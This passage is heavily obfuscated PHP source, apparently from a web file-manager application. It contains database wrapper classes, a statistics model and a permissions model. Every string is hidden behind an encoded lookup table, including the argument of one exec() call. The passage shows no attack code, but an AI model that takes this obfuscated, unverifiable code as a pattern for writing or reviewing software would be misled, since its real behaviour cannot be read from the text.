$¿Œ¿ˆ…€ .= $ô¨Ò§³§[51] . $¨Ì´ƒÑ[1] . $ô¨Ò§³§[52] . $¨Ì´ƒÑ[0] . $ô¨Ò§³§[53]; } else { $¿Œ¿ˆ…€ .= $ô¨Ò§³§[51] . $¨Ì´ƒÑ[0] . $ô¨Ò§³§[53]; } break; case $ô¨Ò§³§[991]: case $ô¨Ò§³§[1009]: break; case $ô¨Ò§³§[993]: break; case $ô¨Ò§³§[992]: case $ô¨Ò§³§[994]: break; case $ô¨Ò§³§[1021]: default: $¿Œ¿ˆ…€ .= $ô¨Ò§³§[51] . $¨Ì´ƒÑ . $ô¨Ò§³§[53]; } } return $¿Œ¿ˆ…€; } public function parseKey(&$Œæó™Ûğ, $ß´›üÓÌ = true) { $¨ÕéóÄ =& $_SERVER[Š—Â“œÔ]; if ($ß´›üÓÌ) { $Œæó™Ûğ = $this->parseKeyCheck($Œæó™Ûğ); } if ($this->dbType == $¨ÕéóÄ[1021]) { if ($Œæó™Ûğ != $¨ÕéóÄ[222] && !preg_match($¨ÕéóÄ[985], $Œæó™Ûğ)) { $Œæó™Ûğ = $¨ÕéóÄ[463] . trim($Œæó™Ûğ, $¨ÕéóÄ[463]) . $¨ÕéóÄ[463]; } return $Œæó™Ûğ; } else { return parent::parseKey($Œæó™Ûğ, $ß´›üÓÌ); } } public function close() { $this->_linkID = null; } public function error() { $“©Ô—ö =& $_SERVER[Š—Â“œÔ]; if ($this->PDOStatement) { $¨Êà¿Ì = $this->PDOStatement->errorInfo(); $this->error = $¨Êà¿Ì[1] . $“©Ô—ö[4] . $¨Êà¿Ì[2]; } else { $this->error = $“©Ô—ö[12]; } if ($“©Ô—ö[12] != $this->queryStr) { $this->error .= LNG($“©Ô—ö[48]) . $this->queryStr; } think_trace($this->error, $“©Ô—ö[12], $“©Ô—ö[49]); return $this->error; } public function escapeString($Æ€¥áÀ) { $ÆÖÜ¾ƒ =& $_SERVER[Š—Â“œÔ]; switch ($this->dbType) { case $ÆÖÜ¾ƒ[1018]: case $ÆÖÜ¾ƒ[991]: case $ÆÖÜ¾ƒ[1009]: case $ÆÖÜ¾ƒ[1021]: return addslashes($Æ€¥áÀ); case $ÆÖÜ¾ƒ[993]: case $ÆÖÜ¾ƒ[1010]: case $ÆÖÜ¾ƒ[992]: case $ÆÖÜ¾ƒ[994]: return str_ireplace($ÆÖÜ¾ƒ[58], $ÆÖÜ¾ƒ[59], $Æ€¥áÀ); } } protected function parseValue($Ù‹è€£) { $ŒÒæŒ¼£ =& $_SERVER[Š—Â“œÔ]; if (is_string($Ù‹è€£)) { $íï£Òá¹ = strpos($Ù‹è€£, $ŒÒæŒ¼£[4]) === 0 && in_array($Ù‹è€£, array_keys($this->bind)); $Ù‹è€£ = $íï£Òá¹ ? $this->escapeString($Ù‹è€£) : $ŒÒæŒ¼£[1031] . $this->escapeString($Ù‹è€£) . $ŒÒæŒ¼£[1031]; } elseif (isset($Ù‹è€£[0]) && is_string($Ù‹è€£[0]) && strtolower($Ù‹è€£[0]) == $ŒÒæŒ¼£[374]) { $Ù‹è€£ = $this->escapeString($Ù‹è€£[1]); } elseif (is_array($Ù‹è€£)) { $Ù‹è€£ = array_map(array($this, $ŒÒæŒ¼£[1032]), $Ù‹è€£); } elseif (is_bool($Ù‹è€£)) { $Ù‹è€£ = $Ù‹è€£ ? $ŒÒæŒ¼£[91] : $ŒÒæŒ¼£[230]; } elseif (is_null($Ù‹è€£)) { $Ù‹è€£ = $ŒÒæŒ¼£[106]; } return $Ù‹è€£; } public function getLastInsertId() { $ªÚ™ © =& $_SERVER[Š—Â“œÔ]; switch ($this->dbType) { case $ªÚ™ ©[1018]: case $ªÚ™ ©[1010]: case $ªÚ™ ©[991]: case $ªÚ™ ©[1009]: case $ªÚ™ ©[993]: case $ªÚ™ ©[1021]: return $this->_linkID->lastInsertId(); case $ªÚ™ ©[992]: case $ªÚ™ ©[994]: $Ñí„èšî = $this->table; $äüïÌò = $this->query("\x53\x45\114\x45\103\124\x20{$Ñí„èšî}\56\x63\165\x72\x72\x76\141\154\x20\143\165\162\x72\x76\x61\x6c\x20\x46\x52\x4f\115\40\x64\x75\141\154"); return $äüïÌò ? $äüïÌò[0][$ªÚ™ ©[1033]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($”Ô ¥È°) { $±…¥ŞÁŒ =& $_SERVER[Š—Â“œÔ]; if (!CacheLock::fileLock($±…¥ŞÁŒ[13])) { return !1; } $Å¥¦±Ø = parent::query($”Ô ¥È°); CacheLock::fileUnLock($±…¥ŞÁŒ[13]); return $Å¥¦±Ø; } public function execute($¯„¡˜àı) { $ÔúŒÖ¯ =& $_SERVER[Š—Â“œÔ]; if (!CacheLock::fileLock($ÔúŒÖ¯[13])) { return !1; } $½«‹“”Ğ = parent::execute($¯„¡˜àı); CacheLock::fileUnLock($ÔúŒÖ¯[13]); return $½«‹“”Ğ; } } class DbSqlite3 extends DbSqlite3Base { public function query($¦†‘ĞÃÁ) { $ÈÛ­Æ²Ó =& $_SERVER[Š—Â“œÔ]; if (!CacheLock::fileLock($ÈÛ­Æ²Ó[13])) { return !1; } $ÁÙ©´²• = parent::query($¦†‘ĞÃÁ); CacheLock::fileUnLock($ÈÛ­Æ²Ó[13]); return $ÁÙ©´²•; } public function execute($ß‚õñ‰) { $¦§à©²ö =& $_SERVER[Š—Â“œÔ]; if (!CacheLock::fileLock($¦§à©²ö[13])) { return !1; } $ßò’ˆ¶ = parent::execute($ß‚õñ‰); CacheLock::fileUnLock($¦§à©²ö[13]); return $ßò’ˆ¶; } } goto EØË¢À¹˜Ü; F™İ«Ş¦†: class AnalysisModel extends ModelBaseLight { public function init($‹ˆ­ş») { $æ’‡¢ùº =& $_SERVER[Š—Â“œÔ]; $§ªó€˜™ = array($æ’‡¢ùº[667] => array($æ’‡¢ùº[33] => $æ’‡¢ùº[1899], $æ’‡¢ùº[352] => array($æ’‡¢ùº[284], $æ’‡¢ùº[832], $æ’‡¢ùº[1900], $æ’‡¢ùº[1901])), $æ’‡¢ùº[1902] => array($æ’‡¢ùº[33] => $æ’‡¢ùº[1903], $æ’‡¢ùº[352] => array($æ’‡¢ùº[284], $æ’‡¢ùº[830], $æ’‡¢ùº[1904], $æ’‡¢ùº[1905], $æ’‡¢ùº[1906]))); if (!isset($§ªó€˜™[$‹ˆ­ş»])) { return !1; } $this->optionType = $§ªó€˜™[$‹ˆ­ş»][$æ’‡¢ùº[33]]; $this->field = $§ªó€˜™[$‹ˆ­ş»][$æ’‡¢ùº[352]]; return !0; } public function listData($ô¿ŞœÂ = false, $Ş÷¸Å¿Ÿ = "\x6d\x6f\x64\x69\146\x79\x54\x69\x6d\145", $¶„ÎûìÇ = false) { return parent::listData($ô¿ŞœÂ, $Ş÷¸Å¿Ÿ, $¶„ÎûìÇ); } public function trendList($¥ò¼ ) { $–õÖ«Ë² =& $_SERVER[Š—Â“œÔ]; $æ¹†ƒ† = $this->listData(); if ($æ¹†ƒ†) { $­Ü¥Ù¨Œ = end($æ¹†ƒ†); $¬ŞÌ’¼ê = date($–õÖ«Ë²[1907], strtotime($–õÖ«Ë²[1908])); if ($­Ü¥Ù¨Œ[$–õÖ«Ë²[284]] == $¬ŞÌ’¼ê) { return $æ¹†ƒ†; } $½ğ±—·› = strtotime($­Ü¥Ù¨Œ[$–õÖ«Ë²[284]]); } if (!isset($½ğ±—·›)) { $¶¤ğŞŞ… = $¥ò¼  == $–õÖ«Ë²[667] ? $–õÖ«Ë²[599] : $–õÖ«Ë²[892]; $½ğ±—·› = Model($¶¤ğŞŞ…)->min($–õÖ«Ë²[233]); } $óååÄé¶ = $–õÖ«Ë²[1909] . ucfirst($¥ò¼ ); $›´’„ãŞ = $this->dateList($½ğ±—·›); foreach ($›´’„ãŞ as $¬ŞÌ’¼ê) { $this->{$óååÄé¶}($¬ŞÌ’¼ê); } return $this->listData(); } private function dateList($çş¨ãÌı) { $“¤ŸÒ¯â =& $_SERVER[Š—Â“œÔ]; $Š¿Ü°¾ş = $çş¨ãÌı; $Ñ¼ ˆÁ = strtotime($“¤ŸÒ¯â[1908]); $şĞğ˜áÅ = array(); while ($Š¿Ü°¾ş <= $Ñ¼ ˆÁ) { $şĞğ˜áÅ[] = date($“¤ŸÒ¯â[1907], $Š¿Ü°¾ş); $Š¿Ü°¾ş = strtotime($“¤ŸÒ¯â[1910], $Š¿Ü°¾ş); } return $şĞğ˜áÅ; } public function _recordUser($°¤îù­õ = '') { $¬ç“ßÕÉ =& $_SERVER[Š—Â“œÔ]; $èÉÅöìú = strtotime(date($¬ç“ßÕÉ[1911], strtotime($°¤îù­õ))); $÷û‰öÀ = strtotime(date($¬ç“ßÕÉ[1912], strtotime($°¤îù­õ))); $‰Â‡ş¼£ = array($¬ç“ßÕÉ[233] => array($¬ç“ßÕÉ[1087], $÷û‰öÀ)); $µ¾°²”› = Model($¬ç“ßÕÉ[599])->where($‰Â‡ş¼£)->count($¬ç“ßÕÉ[1770]); $‰Â‡ş¼£[$¬ç“ßÕÉ[233]] = array($¬ç“ßÕÉ[410], array($èÉÅöìú, $÷û‰öÀ)); $ØäáÁÖ = Model($¬ç“ßÕÉ[599])->where($‰Â‡ş¼£)->count($¬ç“ßÕÉ[1770]); $‰Â‡ş¼£[$¬ç“ßÕÉ[33]] = $¬ç“ßÕÉ[1913]; $ìÙ¼— = Model($¬ç“ßÕÉ[1914])->where($‰Â‡ş¼£)->count($¬ç“ßÕÉ[1915]); $‘¾˜‡šì = array($¬ç“ßÕÉ[284] => $°¤îù­õ, $¬ç“ßÕÉ[832] => (int) $µ¾°²”›, $¬ç“ßÕÉ[1900] => (int) $ØäáÁÖ, $¬ç“ßÕÉ[1901] => (int) $ìÙ¼—); return $this->insert($‘¾˜‡šì); } public function _recordStore($ÓŒŠ°÷€ = '') { $©°Í¤ƒ“ =& $_SERVER[Š—Â“œÔ]; $şÂò­Ç = strtotime(date($©°Í¤ƒ“[1912], strtotime($ÓŒŠ°÷€))); $Á˜©‚¸Ø = array($©°Í¤ƒ“[233] => array($©°Í¤ƒ“[1087], $şÂò­Ç)); $É›Ë‰¶ô = Model($©°Í¤ƒ“[546])->where($Á˜©‚¸Ø)->sum($©°Í¤ƒ“[79]); $Á˜©‚¸Ø[$©°Í¤ƒ“[487]] = 0; $ÉƒÑíûÕ = Model($©°Í¤ƒ“[892])->where($Á˜©‚¸Ø)->sum($©°Í¤ƒ“[79]); $Á˜©‚¸Ø[$©°Í¤ƒ“[190]] = 1; $ ‰–ßÓØ = Model($©°Í¤ƒ“[892])->where($Á˜©‚¸Ø)->sum($©°Í¤ƒ“[79]); $Á˜©‚¸Ø[$©°Í¤ƒ“[190]] = 2; $–¸Í— = Model($©°Í¤ƒ“[892])->where($Á˜©‚¸Ø)->sum($©°Í¤ƒ“[79]); $ôœ·µëŸ = array($©°Í¤ƒ“[284] => $ÓŒŠ°÷€, $©°Í¤ƒ“[830] => (int) $ÉƒÑíûÕ, $©°Í¤ƒ“[1904] => (int) $É›Ë‰¶ô, $©°Í¤ƒ“[1905] => (int) $ ‰–ßÓØ, $©°Í¤ƒ“[1906] => (int) $–¸Í—); return $this->insert($ôœ·µëŸ); } public function trend($ßŸ´Šºˆ, $Õï¸†Šª) { $¢ÅòÑÓı =& $_SERVER[Š—Â“œÔ]; if (!$this->init($ßŸ´Šºˆ)) { return !1; } $ÍİÉÒ÷ø = $this->trendList($ßŸ´Šºˆ); if ($ÍİÉÒ÷ø && $Õï¸†Šª != $¢ÅòÑÓı[1742]) { $æ€ÀíÏ® = $ÍİÉÒ÷ø[0][$¢ÅòÑÓı[284]]; $Í­é¦ˆ = $this->validDate($Õï¸†Šª, $æ€ÀíÏ®); $ÃËê˜ŒÀ = array(); $ÅÌÂü Œ = array_to_keyvalue($ÍİÉÒ÷ø, $¢ÅòÑÓı[284]); foreach ($Í­é¦ˆ as $Õê«¸ä) { if (isset($ÅÌÂü Œ[$Õê«¸ä])) { $„ø¡„á = $ÅÌÂü Œ[$Õê«¸ä]; } else { $„ø¡„á = end($ÍİÉÒ÷ø); $„ø¡„á[$¢ÅòÑÓı[284]] = $Õê«¸ä; if ($ßŸ´Šºˆ == $¢ÅòÑÓı[667]) { $„ø¡„á[$¢ÅòÑÓı[1900]] = $„ø¡„á[$¢ÅòÑÓı[1901]] = 0; } } $ÃËê˜ŒÀ[] = $„ø¡„á; } $ÍİÉÒ÷ø = $ÃËê˜ŒÀ; } $ÌĞ•£Úş = array($¢ÅòÑÓı[667] => array($¢ÅòÑÓı[832] => LNG($¢ÅòÑÓı[1916]), $¢ÅòÑÓı[1900] => LNG($¢ÅòÑÓı[1917]), $¢ÅòÑÓı[1901] => LNG($¢ÅòÑÓı[1918])), $¢ÅòÑÓı[1902] => array($¢ÅòÑÓı[830] => LNG($¢ÅòÑÓı[1919]), $¢ÅòÑÓı[1904] => LNG($¢ÅòÑÓı[1920]), $¢ÅòÑÓı[1905] => LNG($¢ÅòÑÓı[1921]), $¢ÅòÑÓı[1906] => LNG($¢ÅòÑÓı[1922]))); $É„šïÊê = array($¢ÅòÑÓı[667] => $¢ÅòÑÓı[1923], $¢ÅòÑÓı[1902] => $¢ÅòÑÓı[79]); if (empty($ÍİÉÒ÷ø)) { $Õê«¸ä = date($¢ÅòÑÓı[1907], strtotime($¢ÅòÑÓı[1908])); $å¹‰ĞÁ× = array($¢ÅòÑÓı[284] => $Õê«¸ä); foreach ($ÌĞ•£Úş[$ßŸ´Šºˆ] as $Üß‹ª”ú => $ÚÊÜµù) { $å¹‰ĞÁ×[$Üß‹ª”ú] = 0; } $ÍİÉÒ÷ø[] = $å¹‰ĞÁ×; } $‹À£úÏ¾ = array(); foreach ($ÍİÉÒ÷ø as $ÚÊÜµù) { if ($ßŸ´Šºˆ == $¢ÅòÑÓı[1902] && $ÚÊÜµù[$¢ÅòÑÓı[1904]] > $ÚÊÜµù[$¢ÅòÑÓı[830]]) { $ÚÊÜµù[$¢ÅòÑÓı[1904]] = $ÚÊÜµù[$¢ÅòÑÓı[830]]; } foreach ($ÌĞ•£Úş[$ßŸ´Šºˆ] as $Üß‹ª”ú => $± Ëç„) { $„ø¡„á = array($¢ÅòÑÓı[284] => $ÚÊÜµù[$¢ÅòÑÓı[284]], $¢ÅòÑÓı[1658] => $± Ëç„); $„ø¡„á[$É„šïÊê[$ßŸ´Šºˆ]] = isset($ÚÊÜµù[$Üß‹ª”ú]) ? $ÚÊÜµù[$Üß‹ª”ú] : 0; $‹À£úÏ¾[] = $„ø¡„á; } } return $‹À£úÏ¾; } public function validDate($íá­ä„, $ÎÃ˜Ñµ½) { $·²é‡¬ =& $_SERVER[Š—Â“œÔ]; $ç»µ÷¡æ = date($·²é‡¬[1907], strtotime($·²é‡¬[1908])); $ãÄ¯²ÍÉ = array($ç»µ÷¡æ); switch ($íá­ä„) { case $·²é‡¬[1749]: $×Ş¶µÂ‘ = mktime(0, 0, 0, date($·²é‡¬[1924]), date($·²é‡¬[1450]) - date($·²é‡¬[1540]) + 7 - 7, date($·²é‡¬[1925])); $ƒİ–ü­Å = 0; do { $”Êşöß• = date($·²é‡¬[1907], $×Ş¶µÂ‘ - 3600 * 24 * 7 * $ƒİ–ü­Å); $ãÄ¯²ÍÉ[] = $”Êşöß•; $ƒİ–ü­Å++; } while ($ÎÃ˜Ñµ½ < $”Êşöß•); break; case $·²é‡¬[1747]: $ƒİ–ü­Å = 1; do { $½¥¾ìºÂ = date($·²é‡¬[1926], strtotime("\55\x20{$ƒİ–ü­Å}\40\155\x6f\156\164\x68\163")); $ãÄ¯²ÍÉ[] = $½¥¾ìºÂ; $ƒİ–ü­Å++; } while ($ÎÃ˜Ñµ½ < $½¥¾ìºÂ); break; case $·²é‡¬[1927]: $ĞÎ…¾‹ = (int) date($·²é‡¬[1925], strtotime($ÎÃ˜Ñµ½)); $¢¬›˜Ü = (int) date($·²é‡¬[1925]); if ($ĞÎ…¾‹ >= $¢¬›˜Ü) { break; } for ($ĞÎ…¾‹; $ĞÎ…¾‹ < $¢¬›˜Ü; $ĞÎ…¾‹++) { $ãÄ¯²ÍÉ[] = $ĞÎ…¾‹ . $·²é‡¬[1928]; } break; default: break; } if ($ÎÃ˜Ñµ½ > end($ãÄ¯²ÍÉ)) { array_pop($ãÄ¯²ÍÉ); } sort($ãÄ¯²ÍÉ); return $ãÄ¯²ÍÉ; } public function listTable($îŒ«—™œ) { $ŞõÓŠı = ucfirst($îŒ«—™œ); return Model($ŞõÓŠı)->listData(); } public function option($Õ¸¯Ê¬‚) { $î¸ğÆ¤“ = $_SERVER[Š—Â“œÔ][1929] . ucfirst($Õ¸¯Ê¬‚); return $this->{$î¸ğÆ¤“}(); } private function optionUser() { $ÉÂ±¤–Ã =& $_SERVER[Š—Â“œÔ]; $¿µàÆÈ¢ = Model($ÉÂ±¤–Ã[599])->count($ÉÂ±¤–Ã[1770]); $Í¨ùšÕ¤ = Model($ÉÂ±¤–Ã[599])->where($ÉÂ±¤–Ã[1930])->count($ÉÂ±¤–Ã[1770]); $éš•«ú’ = intval($GLOBALS[$ÉÂ±¤–Ã[6]][$ÉÂ±¤–Ã[426]][$ÉÂ±¤–Ã[1715]]) / 3600; $Ú§Ç†ÊÕ = strtotime("\x2d{$éš•«ú’}\40\x68\157\x75\x72\x73"); $µ™´Êµ¨ = strtotime(date($ÉÂ±¤–Ã[1911])); if ($Ú§Ç†ÊÕ < $µ™´Êµ¨) { $Ú§Ç†ÊÕ = $µ™´Êµ¨; } $÷ÅÓ—àç = array($ÉÂ±¤–Ã[1931] => array($ÉÂ±¤–Ã[1088], $Ú§Ç†ÊÕ)); $’¤ğ”¹á = (int) Model($ÉÂ±¤–Ã[599])->where($÷ÅÓ—àç)->count($ÉÂ±¤–Ã[1770]); if (!$’¤ğ”¹á) { $’¤ğ”¹á = 1; } $÷ÅÓ—àç = array($ÉÂ±¤–Ã[1931] => array($ÉÂ±¤–Ã[1088], $µ™´Êµ¨)); $ß©Ñ†êÖ = Model($ÉÂ±¤–Ã[599])->where($÷ÅÓ—àç)->count($ÉÂ±¤–Ã[1770]); return array($ÉÂ±¤–Ã[825] => (int) $¿µàÆÈ¢, $ÉÂ±¤–Ã[1932] => (int) ($¿µàÆÈ¢ - $Í¨ùšÕ¤), $ÉÂ±¤–Ã[1933] => (int) $Í¨ùšÕ¤, $ÉÂ±¤–Ã[1934] => (int) $ß©Ñ†êÖ, $ÉÂ±¤–Ã[1935] => $’¤ğ”¹á); } private function optionFile() { $ëÒïö†Æ =& $_SERVER[Š—Â“œÔ]; $µ¦˜ĞÈ¾ = $this->sourceSize(); $îÁî»²‚ = $µ¦˜ĞÈ¾[$ëÒïö†Æ[79]]; $¥ƒÌÃ²¨ = $µ¦˜ĞÈ¾[$ëÒïö†Æ[1904]]; $ß©ö‚´¶ = Model($ëÒïö†Æ[892])->where(array($ëÒïö†Æ[487] => 0))->count($ëÒïö†Æ[193]); $åÊß÷™ = array($ëÒïö†Æ[487] => 0, $ëÒïö†Æ[233] => array($ëÒïö†Æ[1088], strtotime(date($ëÒïö†Æ[1911])))); $İµ¨ÃÙ´ = Model($ëÒïö†Æ[892])->where($åÊß÷™)->sum($ëÒïö†Æ[79]); $˜ÄõÉ¸ñ = Model($ëÒïö†Æ[892])->where($åÊß÷™)->count($ëÒïö†Æ[193]); return array($ëÒïö†Æ[830] => $îÁî»²‚, $ëÒïö†Æ[1904] => $¥ƒÌÃ²¨, $ëÒïö†Æ[1936] => $îÁî»²‚ - $¥ƒÌÃ²¨, $ëÒïö†Æ[1937] => (int) $İµ¨ÃÙ´, $ëÒïö†Æ[832] => (int) $ß©ö‚´¶, $ëÒïö†Æ[1938] => (int) $˜ÄõÉ¸ñ); } private function optionAccess() { $ÖÌùï· =& $_SERVER[Š—Â“œÔ]; return array($ÖÌùï·[825] => $this->typeLogCnt(), $ÖÌùï·[110] => $this->typeLogCnt($ÖÌùï·[110]), $ÖÌùï·[527] => $this->typeLogCnt($ÖÌùï·[527]), $ÖÌùï·[1939] => $this->typeLogCnt($ÖÌùï·[1939]), $ÖÌùï·[1940] => $this->typeLogCnt($ÖÌùï·[1940]), $ÖÌùï·[667] => $this->typeLogCnt($ÖÌùï·[12], $ÖÌùï·[1915])); } private function typeLogCnt($·ÓÖªšã = '', $ÈŞõÑÑÏ = "\x69\x64") { $Ïı¸ìˆÄ =& $_SERVER[Š—Â“œÔ]; $ŒÓÀÆ‰ = array($Ïı¸ìˆÄ[110] => array($Ïı¸ìˆÄ[1941], $Ïı¸ìˆÄ[1942]), $Ïı¸ìˆÄ[527] => array($Ïı¸ìˆÄ[1943], $Ïı¸ìˆÄ[1944]), $Ïı¸ìˆÄ[1939] => array($Ïı¸ìˆÄ[1945], $Ïı¸ìˆÄ[1946], $Ïı¸ìˆÄ[1947]), $Ïı¸ìˆÄ[1940] => array($Ïı¸ìˆÄ[1948], $Ïı¸ìˆÄ[1949]), $Ïı¸ìˆÄ[1950] => array($Ïı¸ìˆÄ[1951], $Ïı¸ìˆÄ[1952], $Ïı¸ìˆÄ[1953])); $”§Ò©ˆä = strtotime(date($Ïı¸ìˆÄ[1911])); $ºÍí§ÎÎ = array($Ïı¸ìˆÄ[233] => array($Ïı¸ìˆÄ[1088], $”§Ò©ˆä)); if ($·ÓÖªšã) { $ºÍí§ÎÎ[$Ïı¸ìˆÄ[33]] = array($Ïı¸ìˆÄ[7], $ŒÓÀÆ‰[$·ÓÖªšã]); } $ÙîÔ·«‰ = Model($Ïı¸ìˆÄ[1914])->where($ºÍí§ÎÎ)->count($ÈŞõÑÑÏ); return (int) $ÙîÔ·«‰; } private function optionServer() { $çì›Şï¡ =& $_SERVER[Š—Â“œÔ]; $äù‘×š» = $this->diskDriver(); $µğÌìÄ = KodIO::defaultDriver(); $­ò²‚ÅĞ = array($çì›Şï¡[885] => $µğÌìÄ[$çì›Şï¡[477]]); $áš×ÍÅ» = Model($çì›Şï¡[546])->where($­ò²‚ÅĞ)->sum($çì›Şï¡[79]); $™ôùï»¾ = explode($çì›Şï¡[53], $_SERVER[$çì›Şï¡[147]]); $‚åÇòáñ = $™ôùï»¾[0]; $€şàöµ­ = $GLOBALS[$çì›Şï¡[6]][$çì›Şï¡[21]]; $÷á”ï€ = $€şàöµ­[$çì›Şï¡[1050]]; if ($÷á”ï€ == $çì›Şï¡[1038]) { $¦ûÍÙî = explode($çì›Şï¡[1366], $€şàöµ­[$çì›Şï¡[1049]]); $÷á”ï€ = $¦ûÍÙî[0]; } if ($÷á”ï€ == $çì›Şï¡[986] || $÷á”ï€ == $çì›Şï¡[872]) { $ıƒúÇ¿ö = Model()->db()->query($çì›Şï¡[1954]); $ÓíàîËî = $ıƒúÇ¿ö[0] && isset($ıƒúÇ¿ö[0][$çì›Şï¡[1657]]) ? $ıƒúÇ¿ö[0][$çì›Şï¡[1657]] : 0; $÷á”ï€ = $çì›Şï¡[1955] . ($ÓíàîËî ? $çì›Şï¡[8] . $ÓíàîËî : $çì›Şï¡[12]); } $Ï‘¸«¬¾ = $GLOBALS[$çì›Şï¡[6]][$çì›Şï¡[426]][$çì›Şï¡[894]]; return array($çì›Şï¡[1956] => $äù‘×š» ? $äù‘×š»[$çì›Şï¡[1957]] : 0, $çì›Şï¡[1958] => $äù‘×š» ? $äù‘×š»[$çì›Şï¡[1959]] : 0, $çì›Şï¡[1960] => (int) $µğÌìÄ[$çì›Şï¡[1957]] * 1024 * 1024 * 1024, $çì›Şï¡[1961] => (int) $áš×ÍÅ», $çì›Şï¡[1962] => ucfirst($‚åÇòáñ), $çì›Şï¡[1963] => $çì›Şï¡[1964] . PHP_VERSION, $çì›Şï¡[1965] => phpBuild64() ? 64 : 32, $çì›Şï¡[824] => str_replace($çì›Şï¡[1206], $çì›Şï¡[1066], $÷á”ï€), $çì›Şï¡[426] => ucfirst($Ï‘¸«¬¾), $çì›Şï¡[32] => $_SERVER[$çì›Şï¡[1966]]); } private function diskDriver() { $Ö§ÚÆÍ² =& $_SERVER[Š—Â“œÔ]; $ÌÕ¹¿© = $Ö§ÚÆÍ²[8]; $•Û²ÂúĞ = $GLOBALS[$Ö§ÚÆÍ²[6]][$Ö§ÚÆÍ²[1383]] == $Ö§ÚÆÍ²[1384]; if ($•Û²ÂúĞ) { $ÌÕ¹¿© = $Ö§ÚÆÍ²[1967]; if (function_exists($Ö§ÚÆÍ²[1968])) { exec($Ö§ÚÆÍ²[1969], $Ô³Ô¯÷); $ÌÕ¹¿© = $Ô³Ô¯÷[1] . $Ö§ÚÆÍ²[8]; } } if (!file_exists($ÌÕ¹¿©)) { return; } if (!function_exists($Ö§ÚÆÍ²[1970])) { return; } $Ó‰ª§÷ = @disk_total_space($ÌÕ¹¿©); $…Öõ˜×Ó = $Ó‰ª§÷ - @disk_free_space($ÌÕ¹¿©); return array($Ö§ÚÆÍ²[1957] => $Ó‰ª§÷, $Ö§ÚÆÍ²[1959] => $…Öõ˜×Ó); } public function fileChart($ªİÏíõ) { $å “¼„¨ =& $_SERVER[Š—Â“œÔ]; if (isset($ªİÏíõ[$å “¼„¨[1770]])) { return Model($å “¼„¨[892])->userFileTypeProfile($ªİÏíõ[$å “¼„¨[1770]]); } if (isset($ªİÏíõ[$å “¼„¨[1971]])) { return Model($å “¼„¨[892])->groupFileTypeProfile($ªİÏíõ[$å “¼„¨[1971]]); } $×ÚĞéïı = $this->sourceSize(); $¨ª¬…úé = array($å “¼„¨[192] => 0, $å “¼„¨[190] => 1); $†©Óò«ï = Model($å “¼„¨[892])->where($¨ª¬…úé)->sum($å “¼„¨[79]); $¨ª¬…úé[$å “¼„¨[190]] = 2; $ÃâÂ•ã = Model($å “¼„¨[892])->where($¨ª¬…úé)->sum($å “¼„¨[79]); return array($å “¼„¨[830] => $×ÚĞéïı[$å “¼„¨[79]], $å “¼„¨[1904] => $×ÚĞéïı[$å “¼„¨[1904]], $å “¼„¨[1905] => (int) $†©Óò«ï, $å “¼„¨[1906] => (int) $ÃâÂ•ã); } private function sourceSize() { $Êç§ô©Ë =& $_SERVER[Š—Â“œÔ]; $°œ²¯“ = Model($Êç§ô©Ë[892])->where(array($Êç§ô©Ë[487] => 0))->sum($Êç§ô©Ë[79]); $­ß¾¹¦Ê = Model($Êç§ô©Ë[546])->sum($Êç§ô©Ë[79]); if ($­ß¾¹¦Ê > $°œ²¯“) { $­ß¾¹¦Ê = $°œ²¯“; } return array($Êç§ô©Ë[79] => (int) $°œ²¯“, $Êç§ô©Ë[1904] => (int) $­ß¾¹¦Ê); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ƒÑ®Ö±ú =& $_SERVER[Š—Â“œÔ]; $·¤®ö¬¨ = array(array($ƒÑ®Ö±ú[496] => LNG($ƒÑ®Ö±ú[1972]), $ƒÑ®Ö±ú[1973] => $ƒÑ®Ö±ú[1974], $ƒÑ®Ö±ú[1975] => 1, $ƒÑ®Ö±ú[1976] => 1, $ƒÑ®Ö±ú[1977] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ƒÑ®Ö±ú[496] => LNG($ƒÑ®Ö±ú[1978]), $ƒÑ®Ö±ú[1973] => $ƒÑ®Ö±ú[1979], $ƒÑ®Ö±ú[1975] => 2, $ƒÑ®Ö±ú[1976] => 1, $ƒÑ®Ö±ú[1977] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ƒÑ®Ö±ú[496] => LNG($ƒÑ®Ö±ú[1980]), $ƒÑ®Ö±ú[1973] => $ƒÑ®Ö±ú[1981], $ƒÑ®Ö±ú[1975] => 3, $ƒÑ®Ö±ú[1976] => 1, $ƒÑ®Ö±ú[1977] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ƒÑ®Ö±ú[496] => LNG($ƒÑ®Ö±ú[1982]), $ƒÑ®Ö±ú[1973] => $ƒÑ®Ö±ú[1983], $ƒÑ®Ö±ú[1975] => 4, $ƒÑ®Ö±ú[1976] => 1, $ƒÑ®Ö±ú[1977] => self::AUTH_SHOW | self::AUTH_VIEW), array($ƒÑ®Ö±ú[496] => LNG($ƒÑ®Ö±ú[1984]), $ƒÑ®Ö±ú[1973] => $ƒÑ®Ö±ú[1985], $ƒÑ®Ö±ú[1975] => 5, $ƒÑ®Ö±ú[1976] => 1, $ƒÑ®Ö±ú[1977] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ƒÑ®Ö±ú[496] => LNG($ƒÑ®Ö±ú[1986]), $ƒÑ®Ö±ú[1973] => $ƒÑ®Ö±ú[1987], $ƒÑ®Ö±ú[1975] => 6, $ƒÑ®Ö±ú[1976] => 1, $ƒÑ®Ö±ú[1977] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | 